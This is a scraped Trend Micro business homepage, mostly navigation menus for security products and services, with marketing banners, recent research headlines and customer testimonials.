        Improve your risk posture with attack surface management

        [Learn more](/en_ie/business/solutions/challenges/cyber-risk.html)
    - [Protect Cloud-Native Apps](/en_ie/business/solutions/challenges/cloud-native-applications.html)
      * Protect Cloud-Native Apps

        Security that enables business outcomes

        [Learn more](/en_ie/business/solutions/challenges/cloud-native-applications.html)
    - [Protect Your Hybrid World](/en_ie/business/solutions/challenges/hybrid-cloud.html)
      * Protect Your Hybrid, Multi-Cloud World

        Gain visibility and meet business needs with security

        [Learn more](/en_ie/business/solutions/challenges/hybrid-cloud.html)
    - [Securing Your Borderless Workforce](/en_ie/business/solutions/challenges/infrastructure-security.html)
      * Securing Your Borderless Workforce

        Connect with confidence from anywhere, on any device

        [Learn more](/en_ie/business/solutions/challenges/infrastructure-security.html)
    - [Eliminate Network Blind Spots](/en_ie/business/solutions/challenges/network-security.html)
      * Eliminate Network Blind Spots

        Secure users and key operations throughout your environment

        [Learn more](/en_ie/business/solutions/challenges/network-security.html)
    - [See More. Respond Faster.](/en_ie/business/solutions/challenges/detection-response.html)
      * See More. Respond Faster.

        Move faster than your adversaries with powerful purpose-built XDR, attack surface risk management, and zero trust capabilities

        [Learn more](/en_ie/business/solutions/challenges/detection-response.html)
    - [Extend Your Team](/en_ie/business/solutions/challenges/managed-services.html)
      * Extend Your Team. Respond to Threats Agilely

        Maximize effectiveness with proactive risk reduction and managed services

        [Learn more](/en_ie/business/solutions/challenges/managed-services.html)
    - [Operationalizing Zero Trust](/en_ie/business/solutions/challenges/zero-trust.html)
      * Operationalizing Zero Trust

        Understand your attack surface, assess your risk in real time, and adjust policies across network, workloads, and devices from a single console

        [Learn more](/en_ie/business/solutions/challenges/zero-trust.html)
  + [By Role](/en_ie/business/solutions/role.html)
    - [By Role](/en_ie/business/solutions/role.html)
      * By Role
        [Learn more](/en_ie/business/solutions/role.html)
    - [CISO](/en_ie/business/solutions/role/ciso.html)
      * CISO

        Drive business value with measurable cybersecurity outcomes

        [Learn more](/en_ie/business/solutions/role/ciso.html)
    - [SOC Manager](/en_ie/business/solutions/role/soc.html)
      * SOC Manager

        See more, act faster

        [Learn more](/en_ie/business/solutions/role/soc.html)
    - [Infrastructure Manager](/en_ie/business/solutions/role/it-infrastructure-operations.html)
      * Infrastructure Manager

        Evolve your security to mitigate threats quickly and effectively

        [Learn more](/en_ie/business/solutions/role/it-infrastructure-operations.html)
    - [Cloud Builder and Developer](/en_ie/business/solutions/role/cloud-developer.html)
      * Cloud Builder and Developer

        Ensure code runs only as intended

        [Learn more](/en_ie/business/solutions/role/cloud-developer.html)
    - [Cloud Security Ops](/en_ie/business/solutions/role/cloud-operations.html)
      * Cloud Security Ops

        Gain visibility and control with security designed for cloud environments

        [Learn more](/en_ie/business/solutions/role/cloud-operations.html)
  + [By Industry](/en_ie/business/capabilities/solutions-for.html)
    - [By Industry](/en_ie/business/capabilities/solutions-for.html)
      * By Industry
        [Learn more](/en_ie/business/capabilities/solutions-for.html)
    - [Automotive](https://vicone.com/en)
      * Automotive
        [Learn more](https://vicone.com/en)
    - [5G Networks](/en_ie/business/solutions/iot/enterprise-5g-iot.html)
      * 5G Networks
        [Learn more](/en_ie/business/solutions/iot/enterprise-5g-iot.html)
    - [Electric Utility](/en_ie/business/solutions/iot/ics-ot.html)
      * Electric Utility

        ICS/OT Security for the electric utility

        [Learn more](/en_ie/business/solutions/iot/ics-ot.html)
    - [Oil & Gas](/en_ie/business/solutions/iot/ics-ot.html)
      * Oil & Gas

        ICS/OT Security for the oil and gas utility industry

        [Learn more](/en_ie/business/solutions/iot/ics-ot.html)
    - [Manufacturing](/en_ie/business/solutions/iot/ics-ot.html)
      * Manufacturing

        Protecting your factory environments – from traditional devices to state-of-the-art infrastructures

        [Learn more](/en_ie/business/solutions/iot/ics-ot.html)
    - [Public Sector](/content/trendmicro/en_ie/business/public-sector)
      * Public Sector
        [Learn more](/content/trendmicro/en_ie/business/public-sector)
    - [Higher Education](/content/trendmicro/en_ie/business/higher-education)
      * Higher Education
        [Learn more](/content/trendmicro/en_ie/business/higher-education)
    - [Healthcare](/content/trendmicro/en_ie/business/healthcare-cybersecurity)
      * Healthcare

        Protect patient data, devices, and networks while meeting regulations

        [Learn more](/content/trendmicro/en_ie/business/healthcare-cybersecurity)
    - [Financial Services](/content/trendmicro/en_ie/business/financial-services-cybersecurity)
      * Financial Services

        AI-powered cyber risk management to safeguard customer data, build trust and simplify compliance

        [Learn more](/content/trendmicro/en_ie/business/financial-services-cybersecurity)
  + [Small & Midsized Business Security](/en_ie/small-business/platform.html)
    - Small & Midsized Business Security

      Stop threats with easy-to-use solutions designed for your growing business

      [Learn more](/en_ie/small-business/platform.html)
* Platform
  + [Vision One Platform](/en_ie/business/products/one-platform.html)
    - [Vision One Platform](/en_ie/business/products/one-platform.html)
      * Trend Vision One
        Our Unified Platform

        Bridge threat protection and cyber risk management

        [Learn more](/en_ie/business/products/one-platform.html)

        ![](/content/dam/trendmicro/global/en/core/images/console-images/navigation/trend-vision-one-laptop-console-nav.svg)
    - [AI Companion](/en_ie/business/technologies/ai-companion.html)
      * Trend Vision One Companion

        Your generative AI cybersecurity assistant

        [Learn more](/en_ie/business/technologies/ai-companion.html)
  + [Attack Surface Management](/en_ie/business/products/attack-surface-management.html)
    - Attack Surface Management

      Stop breaches before they happen

      [Learn more](/en_ie/business/products/attack-surface-management.html)

      ![](https://trendmicro.scene7.com/is/image/trendmicro/asrm-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
  + [XDR (Extended Detection & Response)](/en_ie/business/products/detection-response/xdr.html)
    - XDR (Extended Detection & Response)

      Stop adversaries faster with a broader perspective and better context to hunt, detect, investigate, and respond to threats from a single platform

      [Learn more](/en_ie/business/products/detection-response/xdr.html)

      ![](https://trendmicro.scene7.com/is/image/trendmicro/xdr-product-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
  + [Endpoint Security](/en_ie/business/products/endpoint-security.html)
    - [Endpoint Security](/en_ie/business/products/endpoint-security.html)
      * Endpoint Security Overview

        Defend the endpoint through every stage of an attack

        [Learn more](/en_ie/business/products/endpoint-security.html)
    - [Industrial Endpoint Security](/en_ie/business/products/iot/industrial-endpoint-security.html)
      * Industrial Endpoint Security
        [Learn more](/en_ie/business/products/iot/industrial-endpoint-security.html)
    - [Workload Security](/en_ie/business/products/endpoint-security/workload-security.html)
      * Workload Security

        Optimized prevention, detection, and response for endpoints, servers, and cloud workloads

        [Learn more](/en_ie/business/products/endpoint-security/workload-security.html)
    - [Mobile Security](/en_ie/business/products/user-protection/sps/mobile-security-enterprise.html)
      * Mobile Security

        On-premises and cloud protection against malware, malicious applications, and other mobile threats

        [Learn more](/en_ie/business/products/user-protection/sps/mobile-security-enterprise.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/sps-mobile-security-enterprise-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
    - [XDR for Endpoint](/en_ie/business/products/detection-response/xdr.html)
      * XDR for Endpoint

        Stop adversaries faster with a broader perspective and better context to hunt, detect, investigate, and respond to threats from a single platform

        [Learn more](/en_ie/business/products/detection-response/xdr.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/xdr-product-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
  + [Cloud Security](/en_ie/business/products/hybrid-cloud.html)
    - [Cloud Security](/en_ie/business/products/hybrid-cloud.html)
      * Trend Vision One™
        Cloud Security Overview

        The most trusted cloud security platform for developers, security teams, and businesses

        [Learn more](/en_ie/business/products/hybrid-cloud.html)
    - [Container Security](/en_ie/business/products/hybrid-cloud/cloud-one-container-image-security.html)
      * Container Security

        Simplify security for your cloud-native applications with advanced container image scanning, policy-based admission control, and container runtime protection

        [Learn more](/en_ie/business/products/hybrid-cloud/cloud-one-container-image-security.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/cloud-one-container-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
    - [File Security](/en_ie/business/products/hybrid-cloud/cloud-one-file-storage-security.html)
      * File Security

        Protect application workflow and cloud storage against advanced threats

        [Learn more](/en_ie/business/products/hybrid-cloud/cloud-one-file-storage-security.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/cloud-one-file-storage-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
    - [Attack Surface Risk Management for Cloud](/en_ie/business/products/detection-response/attack-surface-management.html)
      * Attack Surface Risk Management for Cloud

        Proactively discover, assess, and reduce cyber risk

        [Learn more](/en_ie/business/products/detection-response/attack-surface-management.html)
    - [XDR for Cloud](/en_ie/business/products/detection-response/xdr.html)
      * XDR for Cloud

        Stop adversaries faster with a broader perspective and better context to hunt, detect, investigate, and respond to threats from a single platform

        [Learn more](/en_ie/business/products/detection-response/xdr.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/xdr-product-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
  + [Network Security](/en_ie/business/products/network.html)
    - [Network Security](/en_ie/business/products/network.html)
      * Network Security Overview

        Expand the power of XDR with network detection and response

        [Learn more](/en_ie/business/products/network.html)
    - [Network Intrusion Prevention (IPS)](/en_ie/business/products/network/intrusion-prevention.html)
      * Network Intrusion Prevention (IPS)

        Protect against known, unknown, and undisclosed vulnerabilities in your network

        [Learn more](/en_ie/business/products/network/intrusion-prevention.html)
    - [Breach Detection System (BDS)](/en_ie/business/products/network/advanced-threat-protection.html)
      * Breach Detection System (BDS)

        Detect and respond to targeted attacks moving inbound, outbound, and laterally

        [Learn more](/en_ie/business/products/network/advanced-threat-protection.html)
    - [Secure Service Edge (SSE)](/en_ie/business/products/network/zero-trust-secure-access.html)
      * Secure Service Edge (SSE)

        Redefine trust and secure digital transformation with continuous risk assessments

        [Learn more](/en_ie/business/products/network/zero-trust-secure-access.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/zero-trust-access-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
    - [Industrial Network Security](/en_ie/business/products/iot/industrial-network-security.html)
      * Industrial Network Security
        [Learn more](/en_ie/business/products/iot/industrial-network-security.html)
    - [XDR for Network](/en_ie/business/products/detection-response/xdr.html)
      * XDR for Network

        Stop adversaries faster with a broader perspective and better context to hunt, detect, investigate, and respond to threats from a single platform

        [Learn more](/en_ie/business/products/detection-response/xdr.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/xdr-product-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
    - [5G Network Security](/en_ie/business/solutions/iot/enterprise-5g-iot.html)
      * 5G Network Security
        [Learn more](/en_ie/business/solutions/iot/enterprise-5g-iot.html)
  + [Email Security](/en_ie/business/products/email-security.html)
    - [Email Security](/en_ie/business/products/email-security.html)
      * Email Security

        Stop phishing, malware, ransomware, fraud, and targeted attacks from infiltrating your enterprise

        [Learn more](/en_ie/business/products/email-security.html)
    - [Email and Collaboration Security](/en_ie/business/products/user-protection/sps/email-and-collaboration.html)
      * Trend Vision One™
        Email and Collaboration Security

        Stop phishing, ransomware, and targeted attacks on any email service including Microsoft 365 and Google Workspace

        [Learn more](/en_ie/business/products/user-protection/sps/email-and-collaboration.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/email-security-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
  + [Threat Insights](/en_ie/business/products/one-platform/threat-insights.html)
    - Threat Insights

      See threats coming from miles away

      [Learn more](/en_ie/business/products/one-platform/threat-insights.html)
  + [All Products, Services, and Trials](/en_ie/business/products.html)
    - All Products, Services, and Trials
      [Learn more](/en_ie/business/products.html)

      ![](https://trendmicro.scene7.com/is/image/trendmicro/all-products-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
  + [OT Security](/en_ie/business/solutions/iot/ics-ot.html)
    - [OT Security](/en_ie/business/solutions/iot/ics-ot.html)
      * OT Security

        Learn about solutions for ICS / OT security.

        [Learn more](/en_ie/business/solutions/iot/ics-ot.html)
    - [Industrial Endpoint Security](/content/trendmicro/en_ie/business/products/iot/industrial-endpoint-security)
      * Industrial Endpoint Security
        [Learn more](/content/trendmicro/en_ie/business/products/iot/industrial-endpoint-security)
    - [Industrial Network Security](/en_ie/business/products/iot/industrial-network-security.html)
      * Industrial Network Security
        [Industrial Network Security](/en_ie/business/products/iot/industrial-network-security.html)
    - [XDR for OT](/en_ie/business/products/detection-response/xdr.html)
      * XDR for OT

        Stop adversaries faster with a broader perspective and better context to hunt, detect, investigate, and respond to threats from a single platform

        [Learn more](/en_ie/business/products/detection-response/xdr.html)

        ![](https://trendmicro.scene7.com/is/image/trendmicro/xdr-product-console-shot?scl=1.0&qlt=95&fmt=webp-alpha)
  + [Identity Security](/en_ie/business/products/identity.html)
    - Identity Security

      End-to-end identity security from identity posture management to detection and response

      [Learn more](/en_ie/business/products/identity.html)
  + [On-Premises Data Sovereignty](/en_ie/business/products/sovereign-private-cloud.html)
    - On-Premises Data Sovereignty

      Prevent, detect, respond and protect without compromising data sovereignty

      [Learn more](/en_ie/business/products/sovereign-private-cloud.html)
* Research
  + [Research](/en_ie/about/threat-research.html)
    - [Research](/en_ie/about/threat-research.html)
      * Research
        [Learn more](/en_ie/about/threat-research.html)
    - [Research, News, and Perspectives](/en_ie/research.html)
      * Research, News, and Perspectives
        [Learn more](/en_ie/research.html)
    - [Research and Analysis](https://www.trendmicro.com/vinfo/ie/security/research-and-analysis/)
      * Research and Analysis
        [Learn more](https://www.trendmicro.com/vinfo/ie/security/research-and-analysis/)
    - [Security News](https://www.trendmicro.com/vinfo/ie/security/news/)
      * Security News
        [Learn more](https://www.trendmicro.com/vinfo/ie/security/news/)
    - [Zero Day Initiatives (ZDI)](https://www.zerodayinitiative.com/about/)
      * Zero Day Initiatives (ZDI)
        [Learn more](https://www.zerodayinitiative.com/about/)
* Services
  + [Our Services](/en_ie/business/services/service-one.html)
    - [Our Services](/en_ie/business/services/service-one.html)
      * Our Services
        [Learn more](/en_ie/business/services/service-one.html)
    - [Service Packages](/en_ie/business/services/service-one.html)
      * Service Packages

        Augment security teams with 24/7/365 managed detection, response, and support

        [Learn more](/en_ie/business/services/service-one.html)
    - [Managed XDR](/en_ie/business/services/managed-xdr.html)
      * Managed XDR

        Augment threat detection with expertly managed detection and response (MDR) for email, endpoints, servers, cloud workloads, and networks

        [Learn more](/en_ie/business/services/managed-xdr.html)
    - [Incident Response](/en_ie/business/services/incident-response.html)
      * [Incident Response](/en_ie/business/services/incident-response.html)
        + Incident Response

          Our trusted experts are on call whether you're experiencing a breach or looking to proactively improve your IR plans

          [Learn more](/en_ie/business/services/incident-response.html)
      * [Insurance Carriers and Law Firms](/en_ie/business/services/incident-response/insurance-law.html)
        + Insurance Carriers and Law Firms

          Stop breaches with the best response and detection technology on the market and reduce clients’ downtime and claim costs

          [Learn more](/en_ie/business/services/incident-response/insurance-law.html)
    - [Support Services](/en_ie/business/services/support-services.html)
      * Support Services
        [Learn more](/en_ie/business/services/support-services.html)
* Partners
  + [Partner Program](/en_ie/partners/program.html)
    - [Partner Program](/en_ie/partners/program.html)
      * Partner Program Overview

        Grow your business and protect your customers with the best-in-class complete, multilayered security

        [Learn more](/en_ie/partners/program.html)
    - [Partner Competencies](/en_ie/partners/competencies.html)
      * Partner Competencies

        Stand out to customers with competency endorsements that showcase your expertise

        [Learn more](/en_ie/partners/competencies.html)
    - [Partner Successes](/en_ie/partners/partner-stories.html)
      * Partner Successes
        [Learn more](/en_ie/partners/partner-stories.html)
    - [Managed Security Service Provider](/en_ie/partners/program/managed-security-service-provider.html)
      * Managed Security Service Provider

        Deliver modern security operations services with our industry-leading XDR

        [Learn more](/en_ie/partners/program/managed-security-service-provider.html)
    - [Managed Service Provider](/en_ie/partners/program/managed-service-provider.html)
      * Managed Service Provider

        Partner with a leading expert in cybersecurity, leverage proven solutions designed for MSPs

        [Learn more](/en_ie/partners/program/managed-service-provider.html)
  + [Alliance Partners](/en_ie/partners/alliance-partners.html)
    - [Alliance Partners](/en_ie/partners/alliance-partners.html)
      * Alliance Partners

        We work with the best to help you optimize performance and value

        [Learn more](/en_ie/partners/alliance-partners.html)
    - [Technology Alliance Partners](/en_ie/partners/alliance-partners/technology.html)
      * Technology Alliance Partners
        [Learn more](/en_ie/partners/alliance-partners/technology.html)
    - [Find Alliance Partners](/en_ie/partners/alliance-partners/explore-alliance-partners.html)
      * Find Alliance Partners
        [Learn more](/en_ie/partners/alliance-partners/explore-alliance-partners.html)
  + [Partner Resources](/en_ie/partners/resources.html)
    - [Partner Resources](/en_ie/partners/resources.html)
      * Partner Resources

        Discover resources designed to accelerate your business’s growth and enhance your capabilities as a Trend Micro partner

        [Learn more](/en_ie/partners/resources.html)
    - [Partner Portal Login](https://partner.trendmicro.com/)
      * Partner Portal Login
        [Login](https://partner.trendmicro.com/)
    - [Trend Campus](/en_ie/partners/campus.html)
      * Trend Campus

        Accelerate your learning with Trend Campus, an easy-to-use education platform that offers personalized technical guidance

        [Learn more](/en_ie/partners/campus.html)
    - [Co-Selling](/en_ie/partners/co-selling.html)
      * Co-Selling

        Access collaborative services designed to help you showcase the value of Trend Vision One™ and grow your business

        [Learn more](/en_ie/partners/co-selling.html)
    - [Become a Partner](https://resources.trendmicro.com/partner_program_get-info.html)
      * Become a Partner
        [Learn more](https://resources.trendmicro.com/partner_program_get-info.html)
  + [Find Partners](https://partner.trendmicro.com/partner-locator-home/)
    - Find Partners

      Locate a partner from whom you can purchase Trend Micro solutions

      [Learn more](https://partner.trendmicro.com/partner-locator-home/)
* Company
  + [Why Trend Micro](/en_ie/about/why-trend-micro.html)
    - [Why Trend Micro](/en_ie/about/why-trend-micro.html)
      * Why Trend Micro
        [Learn more](/en_ie/about/why-trend-micro.html)
    - [Customer Success Stories](/en_ie/about/customer-stories.html)
      * Customer Success Stories
        [Learn more](/en_ie/about/customer-stories.html)
    - [Industry Accolades](/en_ie/about/industry-recognition.html)
      * Industry Accolades
        [Learn more](/en_ie/about/industry-recognition.html)
    - [Strategic Alliances](/en_ie/partners/alliance-partners.html)
      * Strategic Alliances
        [Learn more](/en_ie/partners/alliance-partners.html)
    - [The Human Connection](/content/trendmicro/en_ie/about/human-connections)
      * The Human Connection
        [Learn more](/content/trendmicro/en_ie/about/human-connections)
  + [Compare Trend Micro](/en_ie/about/compare.html)
    - [Compare Trend Micro](/en_ie/about/compare.html)
      * Compare Trend Micro

        See how Trend outperforms the competition

        [Let's go](/en_ie/about/compare.html)
    - [vs. Crowdstrike](/en_ie/about/compare/trend-vs-crowdstrike.html)
      * Trend Micro vs. Crowdstrike

        Crowdstrike provides effective cybersecurity through its cloud-native platform, but its pricing may stretch budgets, especially for organizations seeking cost-effective scalability through a true single platform

        [Let's go](/en_ie/about/compare/trend-vs-crowdstrike.html)
    - [vs. Microsoft](/en_ie/about/compare/trend-vs-microsoft.html)
      * Trend Micro vs. Microsoft

        Microsoft offers a foundational layer of protection, yet it often requires supplemental solutions to fully address customers' security problems

        [Let's go](/en_ie/about/compare/trend-vs-microsoft.html)
    - [vs. Palo Alto Networks](/en_ie/about/compare/trend-vs-palo-alto-networks.html)
      * Trend Micro vs. Palo Alto Networks

        Palo Alto Networks delivers advanced cybersecurity solutions, but navigating its comprehensive suite can be complex and unlocking all capabilities requires significant investment

        [Let's go](/en_ie/about/compare/trend-vs-palo-alto-networks.html)
  + [About Us](/en_ie/about.html)
    - [About Us](/en_ie/about.html)
      * About Us
        [Learn more](/en_ie/about.html)
    - [Trust Center](/en_ie/about/trust-center.html)
      * Trust Center
        [Learn more](/en_ie/about/trust-center.html)
    - [History](/en_ie/about/history-vision-values.html)
      * History
        [Learn more](/en_ie/about/history-vision-values.html)
    - [Diversity, Equity and Inclusion](/en_ie/about/diversity-inclusion.html)
      * Diversity, Equity and Inclusion
        [Learn more](/en_ie/about/diversity-inclusion.html)
    - [Corporate Social Responsibility](/en_ie/about/corporate-social-responsibility.html)
      * Corporate Social Responsibility
        [Learn more](/en_ie/about/corporate-social-responsibility.html)
    - [Leadership](/en_ie/about/leaders.html)
      * Leadership
        [Learn more](/en_ie/about/leaders.html)
    - [Security Experts](/en_ie/about/leading-experts.html)
      * Security Experts
        [Learn more](/en_ie/about/leading-experts.html)
    - [Internet Safety and Cybersecurity Education](/en_ie/initiative-education.html)
      * Internet Safety and Cybersecurity Education
        [Learn more](/en_ie/initiative-education.html)
    - [Legal](/en_ie/about/legal.html)
      * Legal
        [Learn more](/en_ie/about/legal.html)
    - [Investors](/en_us/about/investor-relations.html)
      * Investors
        [Learn more](/en_us/about/investor-relations.html)
    - [Formula E Racing](/en_ie/business/campaigns/formula-e.html)
      * Formula E Racing
        [Learn more](/en_ie/business/campaigns/formula-e.html)
  + [Connect With Us](https://newsroom.trendmicro.com/)
    - [Connect With Us](https://newsroom.trendmicro.com/)
      * Connect With Us
        [Learn more](https://newsroom.trendmicro.com/)
    - [Newsroom](https://newsroom.trendmicro.com/)
      * Newsroom
        [Learn more](https://newsroom.trendmicro.com/)
    - [Events](/en_ie/about/events.html)
      * Events
        [Learn more](/en_ie/about/events.html)
    - [Careers](/en_ie/about/careers.html)
      * Careers
        [Learn more](/en_ie/about/careers.html)
    - [Webinars](/en_ie/about/webinars.html)
      * Webinars
        [Learn more](/en_ie/about/webinars.html)
    - [Executive Briefing Center](/en_ie/business/campaigns/executive-briefing-center.html)
      * Executive Briefing Center

        Experience Trend's culture of innovation and world class threat intelligence

        [Learn more](/en_ie/business/campaigns/executive-briefing-center.html)

Back

Back

Back

Back

* [Free Trials](/en_ie/business/products/trials.html#detection-response)
* [Contact Us](/en_ie/business/get-info-form.html)

[Looking for home solutions?](/en_ie/forHome.html)

[Under Attack?](https://resources.trendmicro.com/Under-Attack-Form-eu.html)
3 Alerts

Back

Unread
All

* [AI Pulse: Reflecting on 2024’s defining AI trends](/en_ie/research/25/a/top-ai-trends-from-2024-review.html)
  close

  [Read more >](/en_ie/research/25/a/top-ai-trends-from-2024-review.html)
* [Redefining Defense: Mapping container security to MITRE ATT&CK](/en_ie/research/25/a/mitre-attack-container-security-detection.html)
  close

  [Learn more >](/en_ie/research/25/a/mitre-attack-container-security-detection.html)
* [How the English cybercriminal underground is evolving amid new tech and increased scrutiny](https://www.trendmicro.com/vinfo/ie/security/news/cybercrime-and-digital-threats/bridging-divides-transcending-borders-the-current-state-of-the-english-underground)
  close

  [Read report >](https://www.trendmicro.com/vinfo/ie/security/news/cybercrime-and-digital-threats/bridging-divides-transcending-borders-the-current-state-of-the-english-underground)

Support

* [Business Support Portal](https://success.trendmicro.com/en-US/)
* [Education and Certification](/en_ie/business/services/support-services/education.html)
* [Contact Support](https://success.trendmicro.com/contact-support-europe)
* [Find a Support Partner](https://partner.trendmicro.com/partner-locator-home/)

Resources

* [AI Security](/en_ie/business/ai.html)
* [Trend Micro vs. Competition](/en_ie/about/compare.html)
* [Cyber Risk Assessments](https://resources.trendmicro.com/security-assessment-service-eu.html)
* [What Is?](/en_ie/what-is.html)
* [Threat Encyclopedia](https://www.trendmicro.com/vinfo/ie/threat-encyclopedia/)
* [Cyber Insurance](/en_ie/business/cyber-insurance.html)
* [Glossary of Terms](https://www.trendmicro.com/vinfo/ie/security/definition/a)
* [Webinars](/en_ie/about/webinars.html)

Log In

* [Vision One](https://signin.v1.trendmicro.com/)
* [Support](https://success.trendmicro.com/en-US/)
* [Partner Portal](https://partner.trendmicro.com/)
* [Cloud One](https://cloudone.trendmicro.com/)
* [Product Activation and Management](https://tm.login.trendmicro.com/simplesaml/saml2/idp/SSOService.php)
* [Referral Affiliate](https://signup.cj.com/member/signup/publisher/?cid=1867119#/branded?_k=xaeu3t)

Back

arrow\_back
search

|  |
| --- |

close

# Named a Leader in the 2024 Gartner® Magic Quadrant™ for Email Security

Discover email security that equips you with integrated workspace protection, versatile implementation, and advanced threat intelligence.

* [Read the report](https://resources.trendmicro.com/Gartner-MQ-ESP.html)
* [Learn more](/en_ie/business/products/user-protection/sps/email-and-collaboration.html)

![Trend logo](/content/dam/trendmicro/global/en/core/images/logos/t-logotype/transparent-white-t-with-grey-accents.png)

I'm sorry; your browser doesn't support HTML video.

![Mitre badge](https://trendmicro.scene7.com/is/image/trendmicro/mitre-engenuity-badge?scl=1.0&qlt=95&fmt=webp-alpha)

**100% Detection. 100% Confidence.**

Trend Vision One™ crushed the 2024 MITRE Engenuity™ ATT&CK Evaluations, excelling against the most sophisticated attack scenarios.

* [See results](/en_ie/business/campaigns/mitre-engenuity-evaluations.html)

![Mitre badge](https://trendmicro.scene7.com/is/image/trendmicro/mitre-logo-gradient?scl=1.0&qlt=95&fmt=webp-alpha)

![artificial future](/content/dam/trendmicro/global/en/business/homepage-heros/artificial-future.png)

# 2025 Security Predictions

Discover the critical cyber threats and trends shaping an AI-driven landscape.

* [See into the future](https://www.trendmicro.com/vinfo/ie/security/news/security-predictions/the-artificial-future-trend-micro-security-predictions-for-2025)

Trending topics

[Trend Micro and CISA Secure-By-Design Pledge

2025/01/23](https://www.trendmicro.com/en_ie/research/25/a/cisa-secure-design-pledge.html)

[Invisible Prompt Injection: A Threat to AI Security

2025/01/22](https://www.trendmicro.com/en_ie/research/25/a/invisible-prompt-injection-secure-ai.html)

[IoT Botnet Linked to Large-scale DDoS Attacks Since the End of 2...

2025/01/17](https://www.trendmicro.com/en_ie/research/25/a/iot-botnet-linked-to-ddos-attacks.html)

Earlier detection. Faster response. Reduced risk.

Stop adversaries faster and consolidate cybersecurity with the AI-powered Trend Vision One™ Platform.

**Reduce cybersecurity costs by 70%   •   Reduce alerts from 1000 to 4 per day   •   65% reduction of dwell time**

* [Watch demo](/content/dam/trendmicro/global/en/core/videos/overview/overview-trend-vison-one-platform.mp4)
* [Try free](/en_ie/business/products/trials.html)
* [Learn more](/en_ie/business/products/one-platform.html)

![Trend Vision One Marketecture](/content/dam/trendmicro/global/en/core/images/diagram/trend-vision-one-marketecture-diagram.svg)

MAXIMIZE EFFECTIVENESS

**Cybersecurity solutions for the cyber threats of today and tomorrow**

![icon](/content/dam/trendmicro/global/en/core/images/icons/reference/pillar-icn.svg)

#### Detect and respond to cyber threats faster

Tackle the challenges of simplifying threat detection and response and leveraging AI/ML models to reduce the constraints on SOC and IT security teams.

[trending\_flat](/en_ie/business/solutions/challenges/detection-response.html)

![icon](/content/dam/trendmicro/global/en/core/images/icons/reference/pillar-icn.svg)

#### Understand, prioritize, and mitigate risk

Meet your solution consolidation goals, compliance requirements, and cyber insurance conditions through continuous attack surface management.

[trending\_flat](/en_ie/business/solutions/challenges/cyber-risk.html)

![icon](/content/dam/trendmicro/global/en/core/images/icons/reference/pillar-icn.svg)

#### Secure your borderless workforce

Mitigate risk from your users and the tools they rely on to be productive, wherever they are with identity, endpoint, email, mobile, and web protection.

[trending\_flat](/en_ie/business/solutions/challenges/infrastructure-security.html)

![icon](/content/dam/trendmicro/global/en/core/images/icons/reference/pillar-icn.svg)

#### Protect your hybrid multi-cloud world

Discover how to realize the benefits of the cloud while seamlessly protecting your cloud environments.

[trending\_flat](/en_ie/business/solutions/challenges/hybrid-cloud.html)

![icon](/content/dam/trendmicro/global/en/core/images/icons/reference/pillar-icn.svg)

#### Protect your cloud-native apps

Achieve complete visibility and control of your applications' security at every stage of their lifecycle.

[trending\_flat](/en_ie/business/solutions/challenges/cloud-native-applications.html)

![icon](/content/dam/trendmicro/global/en/core/images/icons/reference/pillar-icn.svg)

#### Eliminate network blind spots

Leverage high-performance protection that is purpose-built for the entirety of your network environment, from the cloud to the data center to the factory floor.

[trending\_flat](/en_ie/business/solutions/challenges/network-security.html)

WE'VE GOT YOU COVERED

**Augment your security teams with 24/7 managed detection, response, and support.**

Extend your team, swiftly detect and respond to threats, and improve the agility of your security posture with premium support, managed XDR, and incident response services.

* [See how](/en_ie/business/services/managed-xdr.html)

SOLUTIONS BY ROLE

Stay ahead of any security challenge

![CISO](/content/dam/trendmicro/global/en/core/images/icons/branded/ciso-icn.svg)

CISO

Security excellence is within reach. Discover market-leading XDR, dynamic ASRM, and purpose-build solutions to meet your needs today and tomorrow.

* [Learn more](/en_ie/business/solutions/role/ciso.html)

![SOC Managers](/content/dam/trendmicro/global/en/core/images/icons/branded/soc-manager-icn.svg)

SOC Managers

Overcome siloes, complexity, and your growing attack surface to stop adversaries faster with a unified cybersecurity platform.

* [Learn more](/en_ie/business/solutions/role/soc.html)

![Cloud SecOps](/content/dam/trendmicro/global/en/core/images/icons/branded/cloud-secops-icn.svg)

**Cloud SecOps**

Gain full visibility and control to resolve multi-cloud complexity, so you can achieve compliance and secure cloud-native apps.

* [Learn more](/en_ie/business/solutions/role/cloud-operations.html)

![Cloud Developer](/content/dam/trendmicro/global/en/core/images/icons/branded/cloud-developer-icn.svg)

Cloud Developer

Balance security asks while delivering innovative, on-time apps so you can build securely—your way.

* [Learn more](/en_ie/business/solutions/role/cloud-developer.html)

![Infrastructure Manager](/content/dam/trendmicro/global/en/core/images/icons/branded/infrastructure-manager-icn.svg)

Infrastructure

Managers

Evolve your security to protect more with less, enabling you to mitigate threats quickly and effectively.

* [See how](/en_ie/business/solutions/role/it-infrastructure-operations.html)

SUCCESS STORIES

How 500,000+ companies worldwide stay ahead of threats with Trend Micro

[![Panasonic logo](https://trendmicro.scene7.com/is/image/trendmicro/panasonic-white-grid-logo?scl=1.0&qlt=95&fmt=webp-alpha)

"The XDR platform allowed us to connect endpoints, network sensors, and email, providing a single screen for visibility and action."](/en_ie/about/customer-stories/panasonic-north-america.html)

[![Weatherford Independent School District logo](https://trendmicro.scene7.com/is/image/trendmicro/weatherford-school-district-grid-logo?scl=1.0&qlt=95&fmt=webp-alpha)

"After doing some research, I realized no other platform offered the equivalent capability of Trend Micro Vision One."](/en_ie/about/customer-stories/weatherford-independent-school-district.html)

